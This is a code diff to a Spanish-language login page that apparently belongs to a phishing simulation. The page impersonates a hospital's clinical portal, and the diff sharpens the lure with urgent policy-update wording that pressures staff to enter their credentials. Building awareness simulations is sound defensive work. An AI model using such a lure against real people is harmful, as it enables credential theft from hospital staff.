@@ -83,44 +83,20 @@ logSimulationEvent('landing_page_loaded', $sessionId);
 </head>
 <body class="portal-body">
     <main class="portal-shell">
-        <header class="browser-chrome" aria-label="Ventana de acceso institucional">
-            <div class="browser-topbar">
-                <div class="browser-controls" aria-hidden="true">
-                    <span class="browser-control browser-control--red"></span>
-                    <span class="browser-control browser-control--amber"></span>
-                    <span class="browser-control browser-control--green"></span>
-                </div>
-                <p class="browser-title">Portal Clinico | Hospital San Vital</p>
-                <div class="browser-actions" aria-hidden="true">
-                    <span></span>
-                    <span></span>
-                </div>
-            </div>
-            <div class="browser-toolbar">
-                <div class="browser-nav" aria-hidden="true">
-                    <span></span>
-                    <span></span>
-                </div>
-                <div class="browser-address">
-                    <span class="browser-lock" aria-hidden="true"></span>
-                    <span>mail.hospital.com/acceso</span>
-                </div>
-            </div>
-        </header>
-
         <section class="portal-page" aria-label="Acceso institucional">
             <div class="portal-page__header">
                 <p class="eyebrow">Hospital San Vital</p>
-                <h1>Bienvenido al portal clinico.</h1>
+                <h1>Portal Clinico Institucional</h1>
             </div>
 
             <div class="portal-page__body">
                 <section class="login-pane" aria-labelledby="login-title">
                     <div class="login-pane__intro">
-                        <h2 id="login-title">Validacion de acceso</h2>
+                        <h2 id="login-title">Validacion de acceso requerida</h2>
                         <p class="lead">
-                            Para continuar, confirme sus credenciales institucionales desde
-                            <strong>mail.hospital.com</strong>.
+                            Por actualizacion de politicas de proteccion de datos, el acceso al
+                            portal debe validarse antes de continuar desde
+                            <strong>mail.hospital.com</strong>. De lo contrario, no sera posible ingresar.
                         </p>
                     </div>
 
@@ -145,10 +121,13 @@ logSimulationEvent('landing_page_loaded', $sessionId);
                             required
                         >
 
-                        <button type="submit">Iniciar sesion</button>
+                        <button type="submit">Validar acceso</button>
                     </form>
 
-                    <p class="helper-text">Acceso exclusivo para personal autorizado y cuentas institucionales verificadas.</p>
+                    <p class="helper-text">
+                        Acceso exclusivo para personal autorizado. Si la validacion no se completa,
+                        no sera posible ingresar al portal.
+                    </p>
                     <p class="support-link">Problemas con el acceso?</p>
                 </section>
 
